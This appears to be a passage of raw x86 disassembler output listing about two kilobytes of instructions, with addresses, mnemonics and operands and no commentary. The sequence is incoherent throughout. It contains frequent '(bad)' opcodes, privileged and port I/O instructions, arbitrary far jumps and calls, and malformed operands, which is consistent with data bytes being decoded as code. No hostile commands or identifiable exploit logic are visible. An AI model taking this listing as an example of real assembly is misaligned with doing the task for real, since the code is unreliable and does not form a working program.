  413809:	xor    eax,0x495b8268
  41380e:	jecxz  0x413871
  413810:	pop    esp
  413811:	jno    0x4137b9
  413813:	inc    ecx
  413814:	cs ins BYTE PTR es:[edi],dx
  413816:	pop    ds
  413817:	pop    edi
  413818:	sub    BYTE PTR ss:[esi-0x1d],0x41
  41381d:	(bad)  
  413820:	inc    ebp
  413821:	cmp    DWORD PTR [ebx],edx
  413823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413824:	nop
  413825:	mov    cl,0x84
  413827:	pslld  mm0,QWORD PTR [eax+0x1d348381]
  41382e:	scas   al,BYTE PTR es:[edi]
  41382f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413830:	jb     0x4137f9
  413832:	push   esi
  413833:	inc    BYTE PTR [ebx]
  413835:	inc    edx
  413836:	inc    ecx
  413837:	pop    ss
  413838:	adc    al,0xbb
  41383a:	sbb    BYTE PTR [edx-0x5e5d2b80],0x9b
  413841:	fs jp  0x413880
  413844:	les    ebp,FWORD PTR [ecx]
  413846:	or     ecx,edi
  413848:	shr    cl,cl
  41384a:	es dec edi
  41384c:	(bad)  
  41384e:	jmp    0x9ef6:0x4b3ea3fc
  413855:	sbb    DWORD PTR [esi],ebx
  413857:	jae    0x4137f3
  413859:	hlt    
  41385a:	xor    eax,0xe4ad7efd
  41385f:	mov    ebp,cs
  413861:	out    dx,eax
  413862:	pop    ebp
  413863:	loope  0x41382d
  413865:	mov    ebx,0x8292503a
  41386a:	mov    al,0x5f
  41386c:	into   
  41386d:	dec    esp
  41386e:	and    al,0x11
  413870:	lahf   
  413871:	sub    bh,bh
  413873:	mov    ah,0x20
  413875:	in     eax,dx
  413876:	xchg   DWORD PTR [ebx-0x3167087f],edx
  41387c:	xchg   eax,ebp
  41387e:	fnsetpm(287 only) 
  413880:	and    eax,DWORD PTR [edx+esi*1-0x72320fdb]
  413887:	inc    esi
  413888:	retf   0xe5da
  41388b:	mov    bh,0x93
  41388d:	mov    al,ds:0xd3d93825
  413892:	ret    0xb944
  413895:	cld    
  413896:	test   eax,0xe976edf1
  41389b:	xchg   esp,eax
  41389c:	mov    ecx,0xd33db509
  4138a1:	(bad)  
  4138a2:	and    BYTE PTR [esp+esi*8-0x1a],bl
  4138a6:	xchg   edi,eax
  4138a7:	xchg   ecx,eax
  4138a8:	sar    esi,cl
  4138aa:	shr    DWORD PTR [ebp+0xc],1
  4138ad:	loopne 0x413883
  4138af:	or     eax,0x17d0217a
  4138b4:	or     eax,esi
  4138b6:	inc    eax
  4138b7:	xchg   ebp,eax
  4138b8:	pop    eax
  4138b9:	sub    DWORD PTR [ebx+edx*1],edi
  4138bc:	dec    eax
  4138bd:	push   es
  4138be:	xor    DWORD PTR [eax+0x6093c9f3],ecx
  4138c4:	sub    ebp,esp
  4138c6:	mov    dl,0x6
  4138c8:	ins    BYTE PTR es:[edi],dx
  4138c9:	ret    0xe931
  4138cc:	push   eax
  4138cd:	push   edx
  4138ce:	jae    0x4138a9
  4138d0:	es imul edx,ebx,0x4c
  4138d4:	ret    0x771e
  4138d7:	add    dh,BYTE PTR [eax+eiz*2]
  4138da:	shl    DWORD PTR [ecx-0x6b],cl
  4138dd:	rol    DWORD PTR [esi],0xa9
  4138e0:	xchg   ebx,eax
  4138e1:	lods   eax,DWORD PTR ds:[esi]
  4138e2:	dec    esp
  4138e3:	xchg   ecx,eax
  4138e4:	lods   al,BYTE PTR ds:[esi]
  4138e5:	stos   BYTE PTR es:[edi],al
  4138e6:	jbe    0x413923
  4138e8:	push   esi
  4138e9:	ret    0x422c
  4138ec:	cli    
  4138ed:	xchg   DWORD PTR [edi],ebp
  4138ef:	sti    
  4138f0:	jne    0x4138e2
  4138f2:	fisubr WORD PTR [ecx+0x7d183044]
  4138f8:	mov    BYTE PTR [ebx-0x4685114e],ah
  4138fe:	(bad)  
  413900:	cld    
  413901:	jg     0x4138df
  413903:	jns    0x413902
  413905:	int3   
  413906:	leave  
  413907:	pop    edx
  413908:	pushf  
  413909:	xor    BYTE PTR [eax+ebp*4-0xd],bh
  41390d:	scas   al,BYTE PTR es:[edi]
  41390e:	push   ebp
  41390f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413910:	enter  0x97b2,0xe3
  413914:	xchg   esi,eax
  413915:	shr    DWORD PTR [ecx],1
  413917:	out    0x61,eax
  413919:	push   esi
  41391a:	lods   al,BYTE PTR ds:[esi]
  41391b:	shl    BYTE PTR [ebx+0x2a3c1d7c],cl
  413921:	imul   DWORD PTR ds:0x8544cd19
  413927:	test   al,0xc1
  413929:	ret    0x542
  41392c:	mov    DWORD PTR [esi+0x66],esi
  41392f:	sub    BYTE PTR [ebx-0x43112b82],dl
  413935:	mov    ds:0x634305a4,eax
  41393a:	dec    ecx
  41393b:	jge    0x41399c
  41393d:	in     al,dx
  41393e:	lods   eax,DWORD PTR ds:[esi]
  41393f:	shl    DWORD PTR [edi-0x3a32447e],1
  413945:	or     bl,bh
  413947:	pop    ecx
  413948:	xlat   BYTE PTR ds:[ebx]
  413949:	ja     0x413955
  41394b:	or     dl,BYTE PTR [eax-0x36]
  41394e:	mov    al,ds:0x29ba0db7
  413953:	mov    bl,0x47
  413955:	mov    ds:0xcd7c4410,al
  41395a:	sub    ecx,ecx
  41395c:	std    
  41395d:	loopne 0x413908
  41395f:	add    dl,al
  413961:	jae    0x413972
  413963:	mov    edx,0x5ea4dcb4
  413968:	mov    ah,0x25
  41396a:	sub    eax,DWORD PTR [eax+0x38c32d3d]
  413970:	and    eax,0x51ad4a5d
  413975:	mov    ecx,db5
  413978:	repnz xchg ecx,eax
  41397a:	mov    al,0xc4
  41397c:	dec    ebx
  41397d:	or     al,0x26
  41397f:	inc    ebx
  413980:	mov    al,ds:0xf754465c
  413985:	xor    eax,0x2ae17e96
  41398a:	push   ecx
  41398b:	jmp    0x53aa:0xf3759adc
  413992:	int3   
  413993:	mov    edx,0xa502ed23
  413998:	popf   
  413999:	pop    ss
  41399a:	test   eax,0x56e36ae
  41399f:	jb     0x413977
  4139a1:	mov    BYTE PTR [edx+0x78],ch
  4139a4:	add    ah,BYTE PTR [ebx+0x6f]
  4139a7:	and    al,BYTE PTR [ecx-0x63]
  4139aa:	xor    BYTE PTR [edx-0x12],ah
  4139ad:	jp     0x41393b
  4139af:	xchg   ebx,eax
  4139b0:	icebp  
  4139b1:	fstp   DWORD PTR [ebx]
  4139b3:	fadd   DWORD PTR [edx+0x3e]
  4139b6:	loopne 0x41396e
  4139b8:	mov    BYTE PTR [esi],ah
  4139ba:	loopne 0x4139a1
  4139bc:	sbb    al,0xdf
  4139be:	inc    esp
  4139bf:	dec    edx
  4139c0:	and    eax,0xe59de532
  4139c5:	aas    
  4139c6:	repz call 0xaf20:0xf244e8a7
  4139ce:	fld    TBYTE PTR [edx]
  4139d0:	and    al,al
  4139d2:	fsub   QWORD PTR [ebp+0x24]
  4139d5:	adc    ebp,DWORD PTR [eax+0x26]
  4139d8:	cwde   
  4139d9:	call   0x6fd8:0x9d3f89f
  4139e0:	jb     0x4139c5
  4139e2:	popa   
  4139e3:	outs   dx,BYTE PTR ds:[esi]
  4139e4:	pop    eax
  4139e5:	jns    0x41398c
  4139e7:	mov    DWORD PTR [edi-0x69],esi
  4139ea:	jno    0x4139a4
  4139ec:	adc    al,0x48
  4139ee:	xchg   BYTE PTR [edi+esi*1],ah
  4139f1:	and    ecx,DWORD PTR [edx+0x6b]
  4139f4:	cmp    eax,0x14f9ea11
  4139f9:	repnz in eax,0x80
  4139fc:	xor    al,0x9b
  4139fe:	mov    cl,0xe5
  413a00:	push   cs
  413a01:	and    al,BYTE PTR [edi+ebx*2+0x1e5801b5]
  413a08:	adc    BYTE PTR [esi+ebx*4+0x3947985b],bl
  413a0f:	mov    al,0x6f
  413a11:	lds    ebp,FWORD PTR [edi-0x46]
  413a14:	out    dx,al
  413a15:	mov    ecx,0xdb16d43
  413a1a:	add    BYTE PTR [eax-0x3f],ah
  413a1d:	iret   
  413a1e:	sub    ebx,edi
  413a20:	add    edi,esi
  413a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a23:	cmp    eax,DWORD PTR [edi+0x3d]
  413a26:	ins    BYTE PTR es:[edi],dx
  413a27:	cmp    ebp,DWORD PTR [eax]
  413a29:	pandn  mm6,mm6
  413a2c:	pop    ds
  413a2d:	dec    edi
  413a2e:	mov    al,dl
  413a30:	stc    
  413a31:	or     bh,BYTE PTR [edi-0x50]
  413a34:	pop    ss
  413a35:	je     0x413a10
  413a37:	test   eax,0xb6e9d7fa
  413a3c:	les    eax,FWORD PTR [ecx]
  413a3e:	jo     0x413a4b
  413a40:	les    esp,FWORD PTR ds:0xc6755dd7
  413a46:	dec    eax
  413a47:	or     edi,eax
  413a49:	sub    BYTE PTR [edi-0x23],ah
  413a4c:	mov    esi,0xf1b5a0dd
  413a51:	retf   0x6544
  413a54:	and    esi,DWORD PTR [eax+0x63fb2cab]
  413a5a:	inc    ebp
  413a5b:	adc    ch,ah
  413a5d:	pop    ebp
  413a5e:	mov    bl,0x7b
  413a60:	icebp  
  413a61:	pop    edx
  413a62:	fdivp  st(4),st
  413a64:	dec    ebp
  413a65:	mov    ch,0x14
  413a67:	retf   0xd5a4
  413a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a6b:	mov    cl,0x1c
  413a6d:	rcl    BYTE PTR [bp+di+0x38d5],0x6f
  413a73:	pusha  
  413a74:	xchg   esp,eax
  413a75:	dec    BYTE PTR [ebx]
  413a77:	outs   dx,BYTE PTR ds:[esi]
  413a78:	call   0x77f6cc43
  413a7d:	cld    
  413a7e:	rcl    DWORD PTR [esi-0xae7bd46],1
  413a84:	call   0x550e52e7
  413a89:	jno    0x413a95
  413a8b:	jg     0x413ae6
  413a8d:	test   eax,0xf31e0a63
  413a92:	pop    esi
  413a93:	mov    eax,ds:0x520d606b
  413a98:	hlt    
  413a99:	xchg   esi,eax
  413a9a:	ins    BYTE PTR es:[edi],dx
  413a9b:	es fwait
  413a9d:	add    eax,0xf65f7b6e
  413aa2:	arpl   WORD PTR [edi-0x3ee1290f],sp
  413aa8:	jge    0x413acb
  413aaa:	push   ebx
  413aab:	fs nop
  413aad:	add    eax,0xcbee38a4
  413ab2:	gs pop ss
  413ab4:	mov    bh,0xf1
  413ab6:	or     ecx,DWORD PTR [esi-0x27]
  413ab9:	jne    0x413af2
  413abb:	push   es
  413abc:	jmp    0x413afb
  413abe:	ret    
  413abf:	pop    ebx
  413ac0:	mov    eax,ds:0xa0f66b98
  413ac5:	inc    eax
  413ac6:	jge    0x413b25
  413ac8:	mov    edx,0x4eb087cc
  413acd:	sbb    DWORD PTR [ebx],ecx
  413acf:	clc    
  413ad0:	les    ebp,FWORD PTR [edi+0x23]
  413ad3:	adc    eax,0xdab9ab97
  413ad8:	gs fwait
  413ada:	or     eax,0x5a7ddd9e
  413adf:	and    ch,BYTE PTR [ebx-0x5a]
  413ae2:	(bad)  
  413ae3:	fwait
  413ae4:	push   es
  413ae5:	call   0x2323:0xe48441c3
  413aec:	jecxz  0x413adf
  413aee:	xchg   ecx,eax
  413aef:	outs   dx,BYTE PTR ds:[esi]
  413af0:	add    BYTE PTR [edx-0x319cf545],dh
  413af6:	cdq    
  413af7:	fwait
  413af8:	je     0x413a7a
  413afa:	cmp    DWORD PTR [edi+ebx*1-0x1532422d],edi
  413b01:	push   eax
  413b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b03:	je     0x413abf
  413b05:	add    BYTE PTR ds:0xaf175b44,0x5b
  413b0c:	out    0xae,eax
  413b0e:	popf   
  413b0f:	cmc    
  413b10:	ins    DWORD PTR es:[edi],dx
  413b11:	pop    ebp
  413b12:	in     eax,0xe3
  413b14:	in     eax,0xfe
  413b16:	lahf   
  413b17:	in     al,dx
  413b18:	sub    DWORD PTR [eax+edx*1-0x3c],ecx
  413b1c:	adc    DWORD PTR [edx-0x456611db],0xfffffffa
  413b23:	inc    esi
  413b24:	call   0xfc96:0x284da25f
  413b2b:	sub    ecx,eax
  413b2d:	repz xchg esp,eax
  413b2f:	lahf   
  413b30:	sbb    DWORD PTR [edx],eax
  413b32:	mov    ss,WORD PTR [esp+edi*1]
  413b35:	nop
  413b36:	popa   
  413b37:	gs inc ecx
  413b39:	inc    eax
  413b3a:	pushf  
  413b3b:	jg     0x413b83
  413b3d:	(bad)  
  413b3e:	push   ebp
  413b3f:	push   esp
  413b40:	dec    ebx
  413b41:	jmp    0xc6c4:0x11fa229d
  413b48:	ds jnp 0x413bae
  413b4b:	push   ecx
  413b4c:	adc    BYTE PTR [ecx+ecx*2-0x51dd9c07],dl
  413b53:	pop    edi
  413b54:	dec    ebp
  413b55:	cs daa 
  413b57:	xor    edx,DWORD PTR [ebx+ebx*4+0x77ad05b2]
  413b5e:	sub    ch,BYTE PTR [ebx-0x4]
  413b61:	popa   
  413b62:	stos   DWORD PTR es:[edi],eax
  413b63:	sbb    al,ah
  413b65:	or     DWORD PTR [ecx+eiz*4],ecx
  413b68:	shl    eax,1
  413b6a:	repnz mov edx,0x95084f8c
  413b70:	cdq    
  413b71:	adc    eax,0x20e513ca
  413b76:	in     al,dx
  413b77:	jne    0x413b94
  413b79:	(bad)  
  413b7b:	xchg   DWORD PTR [ebx-0xe],esi
  413b7e:	loop   0x413ba3
  413b80:	mov    bl,0x55
  413b82:	mov    BYTE PTR [esi+ecx*8-0x3196ab7],dh
  413b89:	sbb    WORD PTR [ebx+0x6e],0xff95
  413b8e:	(bad)  
  413b8f:	jle    0x413bd6
  413b91:	ror    BYTE PTR [esi+0x568582d4],cl
  413b97:	push   ebp
  413b98:	mov    bh,0x1e
  413b9a:	icebp  
  413b9b:	fldenv [ebx]
  413b9d:	cmp    edx,DWORD PTR [esi-0x2305c4f0]
  413ba3:	add    BYTE PTR [edx+edi*4-0x2d3d5e5b],0xd2
  413bab:	mov    DWORD PTR [ebx+0x6a155455],ecx
  413bb1:	outs   dx,BYTE PTR ds:[esi]
  413bb2:	and    BYTE PTR [edx+ebx*2],ch
  413bb5:	out    0x7a,eax
  413bb7:	nop
  413bb8:	xchg   esi,eax
  413bb9:	stos   DWORD PTR es:[edi],eax
  413bba:	inc    ebp
  413bbb:	pop    ds
  413bbc:	fst    DWORD PTR [esi]
  413bbe:	rol    BYTE PTR [eax+0x37b31dc2],0xa6
  413bc5:	jmp    0xcd9:0x4d50b4fe
  413bcc:	adc    ch,BYTE PTR [eax+eax*1]
  413bcf:	add    DWORD PTR [ebx+0xe59d57d],eax
  413bd5:	cmp    eax,0x410cd0eb
  413bda:	add    BYTE PTR [edi+edi*4+0x6a238da1],ch
  413be1:	xchg   edx,eax
  413be2:	pop    esp
  413be3:	mov    ?,WORD PTR [ecx-0x10]
  413be6:	and    DWORD PTR [ebp+0x822a9f2],eax
  413bec:	mov    ch,0xc0
  413bee:	bswap  edx
  413bf0:	das    
  413bf1:	jecxz  0x413be7
  413bf3:	ret    
  413bf4:	add    BYTE PTR [edi],dl
  413bf6:	mov    bh,0xa6
  413bf8:	imul   eax,DWORD PTR [esi],0xde3d476a
  413bfe:	jne    0x413c3b
  413c00:	and    cl,dl
  413c02:	xchg   ecx,eax
  413c03:	xor    BYTE PTR [edx],0x89
  413c06:	(bad)  
  413c07:	add    al,0x86
  413c09:	clc    
  413c0a:	push   ecx
  413c0b:	xor    DWORD PTR ds:0x89dc3175,ebx
  413c11:	sahf   
  413c12:	xchg   ecx,eax
  413c13:	call   0x728b:0xf1e377b8
  413c1a:	mov    DWORD PTR [ebx+esi*1-0x126f165c],edx
  413c21:	jmp    0x413c19
  413c23:	(bad)  
  413c24:	enter  0x8d9a,0x8c
  413c28:	pop    ebx
  413c29:	or     eax,0x5aa34be3
  413c2e:	xlat   BYTE PTR ds:[ebx]
  413c2f:	push   ebx
  413c30:	ja     0x413c67
  413c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c33:	push   cs
  413c34:	fxch   st(3)
  413c36:	pop    ecx
  413c37:	sbb    BYTE PTR [ecx+ebp*1+0x5bbd5c09],0x40
  413c3f:	and    bl,bl
  413c41:	int3   
  413c42:	push   edx
  413c43:	in     al,0x2f
  413c45:	inc    eax
  413c46:	jge    0x413c54
  413c48:	push   ss
  413c49:	xor    edi,DWORD PTR [ebp-0x79]
  413c4c:	adc    eax,0x6dbc9a61
  413c51:	jns    0x413bec
  413c53:	daa    
  413c54:	push   edx
  413c55:	add    BYTE PTR [ecx-0x380deb2e],dl
  413c5b:	or     ebp,ebx
  413c5d:	cmp    dh,BYTE PTR [edi]
  413c5f:	sbb    ch,dh
  413c61:	pop    ss
  413c62:	jp     0x413c57
  413c64:	loope  0x413c75
  413c66:	scas   eax,DWORD PTR es:[edi]
  413c67:	sbb    BYTE PTR ds:0x38ef7f8c,dl
  413c6d:	jl     0x413c26
  413c6f:	dec    ebx
  413c70:	call   DWORD PTR [esi-0x3005e41c]
  413c76:	xor    eax,0xabc4743d
  413c7b:	jo     0x413c17
  413c7d:	(bad)  
  413c7e:	xchg   ecx,eax
  413c7f:	push   ebx
  413c80:	test   eax,0xa8cbc6bc
  413c85:	or     DWORD PTR [esi],0x4ebf7296
  413c8b:	pop    bp
  413c8d:	call   0xc04a:0xb673b528
  413c94:	xchg   esp,eax
  413c95:	lds    ecx,FWORD PTR [esi-0x4840db00]
  413c9b:	dec    esp
  413c9c:	test   BYTE PTR [edi+0x5],bl
  413c9f:	cmp    dh,bh
  413ca1:	(bad)  
  413ca2:	jge    0x413c74
  413ca4:	fsub   DWORD PTR [esi]
  413ca6:	cmp    al,0x68
  413ca8:	jp     0x413d0c
  413caa:	stos   BYTE PTR es:[edi],al
  413cab:	cmp    al,0x5e
  413cad:	pop    ebp
  413cae:	icebp  
  413caf:	pop    ss
  413cb0:	add    bh,BYTE PTR [eax-0x67]
  413cb3:	ss (bad) 
  413cb5:	jmp    0x413ce1
  413cb7:	adc    eax,DWORD PTR [ebx]
  413cb9:	mov    ds:0x6f111d22,eax
  413cbe:	test   eax,0x55a915d6
  413cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cc5:	and    bl,al
  413cc7:	dec    ax
  413cc9:	sahf   
  413cca:	dec    edx
  413ccb:	and    DWORD PTR [edi+0x48],edx
  413cce:	jle    0x413cd5
  413cd0:	sbb    eax,DWORD PTR [edx+0x7063775e]
  413cd6:	inc    edi
  413cd7:	int    0x3f
  413cd9:	adc    DWORD PTR [esi-0x44691af2],0xffffff9f
  413ce0:	xchg   esp,eax
  413ce1:	cmp    DWORD PTR [ecx+0x8625554],eax
  413ce7:	lock loop 0x413cca
  413cea:	sub    edi,ebx
  413cec:	push   ecx
  413ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cee:	hlt    
  413cef:	rcl    ebp,1
  413cf1:	das    
  413cf2:	int    0xc7
  413cf4:	int    0x45
  413cf6:	add    edx,DWORD PTR [esi+0x6a]
  413cf9:	loope  0x413cdb
  413cfb:	adc    ch,BYTE PTR [ecx]
  413cfd:	enter  0xea9a,0xa3
  413d01:	aad    0xc5
  413d03:	xchg   ecx,eax
  413d04:	lahf   
  413d05:	and    al,0xb5
  413d07:	lods   eax,DWORD PTR ds:[esi]
  413d08:	cmp    eax,DWORD PTR [edi+ecx*4+0x1a]
  413d0c:	scas   eax,DWORD PTR es:[edi]
  413d0d:	(bad)  
  413d0e:	fcom   QWORD PTR [ebx]
  413d10:	adc    edx,edx
  413d12:	icebp  
  413d13:	cmc    
  413d14:	ror    BYTE PTR es:[ecx-0x58af82c1],0xea
  413d1c:	push   cs
  413d1d:	push   edi
  413d1e:	mov    ebp,0x3f03e201
  413d23:	retf   
  413d24:	scas   eax,DWORD PTR es:[edi]
  413d25:	cld    
  413d26:	xchg   edi,eax
  413d27:	stos   DWORD PTR es:[edi],eax
  413d28:	jecxz  0x413d9b
  413d2a:	sbb    DWORD PTR [esi+ebp*4],0x9a44e084
  413d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d32:	sub    al,0x28
  413d34:	mov    edi,0x2c97ae7e
  413d39:	pop    edi
  413d3a:	loopne 0x413d0a
  413d3c:	enter  0x3334,0xf7
  413d40:	cmp    ecx,esp
  413d42:	jb     0x413d7e
  413d44:	cld    
  413d45:	pop    ebp
  413d46:	aad    0x14
  413d48:	pop    ebx
  413d49:	mov    al,ds:0x5c68288
  413d4e:	and    eax,0xa1e8333a
  413d53:	bound  edi,QWORD PTR [edi+ebp*8-0xf]
  413d57:	loope  0x413d16
  413d59:	stos   BYTE PTR es:[edi],al
  413d5a:	pushf  
  413d5b:	retf   
  413d5c:	jae    0x413da0
  413d5e:	(bad)  
  413d5f:	jb     0x413d3d
  413d61:	call   0xc41f:0xc0001d27
  413d68:	int    0xeb
  413d6a:	ins    DWORD PTR es:[edi],dx
  413d6b:	fist   DWORD PTR [eax]
  413d6d:	mov    edi,0xb667ddb6
  413d72:	fnstcw WORD PTR [ebp+0x38]
  413d75:	jne    0x413d59
  413d77:	push   ebp
  413d78:	gs pop esp
  413d7a:	dec    ebx
  413d7b:	idiv   cl
  413d7d:	aad    0x80
  413d7f:	mov    DWORD PTR [ecx+esi*8+0x41bc999b],ebp
  413d86:	bound  esi,QWORD PTR [edx]
  413d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d89:	mov    cs,WORD PTR [edx]
  413d8b:	cli    
  413d8c:	lea    edx,[esi-0x14]
  413d8f:	addr16 cmp eax,0x54c92745
  413d95:	jecxz  0x413de1
  413d97:	fistp  DWORD PTR es:[edi+esi*4]
  413d9b:	and    al,0xad
  413d9d:	ret    0xce42
  413da0:	popa   
  413da1:	stos   DWORD PTR es:[edi],eax
  413da2:	push   cs
  413da3:	pusha  
  413da4:	clc    
  413da5:	clc    
  413da6:	fidivr DWORD PTR [ebp-0x18defdeb]
  413dac:	push   cs
  413dad:	pushf  
  413dae:	and    eax,0xd91bbb13
  413db3:	or     esp,DWORD PTR [ebx]
  413db5:	cmp    BYTE PTR [ebp+ebp*8+0x9211643],bh
  413dbc:	mov    ch,BYTE PTR [eax-0x4f]
  413dbf:	daa    
  413dc0:	ins    DWORD PTR es:[edi],dx
  413dc1:	sbb    BYTE PTR [eax],ch
  413dc3:	das    
  413dc4:	sahf   
  413dc5:	int    0x81
  413dc7:	cli    
  413dc8:	cmp    al,0x5f
  413dca:	jp     0x413e2c
  413dcc:	jne    0x413dc3
  413dce:	pop    ecx
  413dcf:	jae    0x413da7
  413dd1:	lea    ebp,[ecx-0x60]
  413dd4:	and    BYTE PTR [ecx+0x62],ah
  413dd7:	add    eax,edi
  413dd9:	cdq    
  413dda:	jnp    0x413d8e
  413ddc:	sbb    DWORD PTR [ebx],0xffffffc1
  413ddf:	imul   ebx,ebp,0x5c40b8ad
  413de5:	int    0xc1
  413de7:	cmp    edi,esi
  413de9:	sbb    DWORD PTR [edx-0x7e103020],ebp
  413def:	call   0x8113:0xaf3209c
  413df6:	mov    eax,ds:0x1d986492
  413dfb:	mov    edx,0x7e9a40e6
  413e00:	mov    edx,DWORD PTR [ecx-0x80]
  413e03:	nop
  413e04:	inc    esp
  413e05:	add    dl,bh
  413e07:	mov    ch,0x94
  413e09:	xchg   BYTE PTR [ecx],dh
  413e0b:	cld    
  413e0c:	retf   
  413e0d:	sbb    eax,0x34d078ae
  413e12:	and    bl,BYTE PTR [ebx+0x2e90c25a]
  413e18:	(bad)  
  413e19:	in     eax,0xaa
  413e1b:	dec    eax
  413e1c:	xor    ch,BYTE PTR [ebx]
  413e1e:	imul   ebx,DWORD PTR [ecx],0xffffffc9
  413e21:	mov    ecx,0xe6e28b2c
  413e26:	ja     0x413ea6
  413e28:	adc    BYTE PTR [edx+0x252ad6cf],bl
  413e2e:	retf   0x1b23
  413e31:	xor    al,bl
  413e33:	js     0x413dda
  413e35:	xor    BYTE PTR [edi-0x59],0xb3
  413e39:	test   eax,0x17cfcb6a
  413e3e:	mov    BYTE PTR [ebp+0x4d],al
  413e41:	adc    bh,al
  413e43:	or     ch,BYTE PTR [ebp-0x50e5b8ae]
  413e49:	into   
  413e4a:	loope  0x413e0b
  413e4c:	jno    0x413ddd
  413e4e:	push   es
  413e4f:	test   BYTE PTR [edx],al
  413e51:	fidivr DWORD PTR [esi+0x53]
  413e54:	dec    ebx
  413e55:	mov    eax,0x45a373ef
  413e5a:	loop   0x413e8d
  413e5c:	xor    esp,esi
  413e5e:	hlt    
  413e5f:	icebp  
  413e60:	fimul  WORD PTR [edi-0x2de73ed7]
  413e66:	outs   dx,BYTE PTR ds:[esi]
  413e67:	rol    BYTE PTR [esi-0x14],1
  413e6a:	scas   al,BYTE PTR es:[edi]
  413e6b:	int    0xd
  413e6d:	loopne 0x413e8b
  413e6f:	add    dh,BYTE PTR [ecx-0x3c9ff0c5]
  413e75:	stos   BYTE PTR es:[edi],al
  413e76:	mov    bh,0xcd
  413e78:	or     BYTE PTR [ecx+0x4e],0x51
  413e7c:	mov    ah,0xb1
  413e7e:	out    0xf1,eax
  413e80:	xchg   ecx,eax
  413e81:	push   edi
  413e82:	adc    cl,BYTE PTR [edi+0x32]
  413e85:	fwait
  413e86:	or     ah,BYTE PTR [ebx]
  413e88:	adc    BYTE PTR [ebx],dh
  413e8a:	add    DWORD PTR [ecx+0xd],0xffffffaa
  413e8e:	or     cl,0x84
  413e91:	sub    ebp,ecx
  413e93:	xchg   ebp,eax
  413e94:	push   ss
  413e95:	jmp    0x1247481f
  413e9a:	fld    TBYTE PTR [ebp+0x1a175630]
  413ea0:	mov    edi,DWORD PTR [eax-0x3954d7dc]
  413ea6:	adc    ebx,DWORD PTR [ecx+0x19bce74]
  413eac:	adc    DWORD PTR [esi-0x2b],ebx
  413eaf:	and    BYTE PTR [ebx+ebp*8],bl
  413eb2:	nop
  413eb3:	mov    ?,WORD PTR ds:0x830c099
  413eb9:	pop    ds
  413eba:	and    esi,DWORD PTR [ecx+0x15]
  413ebd:	dec    esi
  413ebe:	daa    
  413ebf:	popa   
  413ec0:	add    dl,BYTE PTR [ebx+0x25d84434]
  413ec6:	aas    
  413ec7:	dec    edi
  413ec8:	rol    DWORD PTR [esi+0x2cfab14f],cl
  413ece:	sub    al,0x9
  413ed0:	neg    DWORD PTR [ebx+0x66]
  413ed3:	jl     0x413e8c
  413ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed6:	repnz cs dec edx
  413ed9:	and    DWORD PTR ds:[eax+0x24],edi
  413edd:	scas   eax,DWORD PTR es:[edi]
  413ede:	aam    0x68
  413ee0:	jl     0x413ebb
  413ee2:	fbstp  TBYTE PTR [edx]
  413ee4:	xor    DWORD PTR [ebx],ebp
  413ee6:	dec    ebp
  413ee7:	sbb    al,0x2c
  413ee9:	dec    esi
  413eea:	jae    0x413e87
  413eec:	dec    ebp
  413eed:	fcom   QWORD PTR [ebx]
  413eef:	mov    dl,ch
  413ef1:	out    0x2c,eax
  413ef3:	sub    BYTE PTR [edi],dh
  413ef5:	mov    al,0xfd
  413ef7:	test   eax,0x3e583dd7
  413efc:	mov    cl,0x54
  413efe:	sbb    BYTE PTR [eax-0x5a39c08b],ch
  413f04:	jns    0x413f42
  413f06:	in     al,dx
  413f07:	popa   
  413f08:	das    
  413f09:	in     al,0x4e
  413f0b:	xchg   edi,eax
  413f0c:	test   al,0x92
  413f0e:	mov    ecx,eax
  413f10:	cli    
  413f11:	ret    
  413f12:	and    DWORD PTR [ebx+0xf2d3a4d],ebx
  413f18:	fstp   TBYTE PTR [ecx+eiz*1+0x15]
  413f1c:	sbb    ecx,DWORD PTR [esi+0x64]
  413f1f:	adc    al,0x6f
  413f21:	div    edi
  413f23:	rol    BYTE PTR [ecx+0x7a],0x91
  413f27:	scas   eax,DWORD PTR es:[edi]
  413f28:	mov    ebp,DWORD PTR [edi]
  413f2a:	fsub   QWORD PTR [eax+0x570a80dd]
  413f30:	adc    edx,DWORD PTR [edx]
  413f32:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413f34:	daa    
  413f35:	stos   BYTE PTR es:[edi],al
  413f36:	scas   eax,DWORD PTR es:[edi]
  413f37:	pusha  
  413f38:	jb     0x413fa2
  413f3a:	call   0x5e56dd6d
  413f3f:	mov    ds:0x975e3150,al
  413f44:	(bad)  
  413f45:	aad    0x62
  413f47:	xor    DWORD PTR [ecx-0x5],ebx
  413f4a:	and    dl,cl
  413f4c:	sub    edx,DWORD PTR [ecx-0x21]
  413f4f:	dec    ecx
  413f50:	imul   edi,DWORD PTR [edx],0x4bb9795c
  413f56:	adc    al,BYTE PTR [ebx+0x46]
  413f59:	inc    DWORD PTR [ecx+esi*1-0x58443518]
  413f60:	mov    edx,0x699cd7a9
  413f65:	test   BYTE PTR [edx-0x3754445e],bl
  413f6b:	mov    esi,0xc9e356cb
  413f70:	fldcw  WORD PTR [eax+0x553bc9d9]
  413f76:	in     al,dx
  413f77:	adc    DWORD PTR [edi],ebp
  413f79:	sbb    BYTE PTR [eax-0x38602b87],dh
  413f7f:	xor    ebp,DWORD PTR [edx+0x33]
  413f82:	jmp    0x5beac83f
  413f87:	shl    edx,0xcc
  413f8a:	xchg   DWORD PTR [eax+0x72ba38f2],eax
  413f90:	les    ebp,FWORD PTR [eax+edx*2]
  413f93:	stos   DWORD PTR es:[edi],eax
  413f94:	pushf  
  413f95:	imul   ecx,DWORD PTR [ecx-0x6f],0x55
  413f99:	xor    BYTE PTR [ebx+0x63],al
  413f9c:	aaa    
  413f9d:	pop    ecx
  413f9e:	lahf   
  413f9f:	shr    DWORD PTR [ecx+0x1876ad1f],1
  413fa5:	adc    BYTE PTR [eax],cl
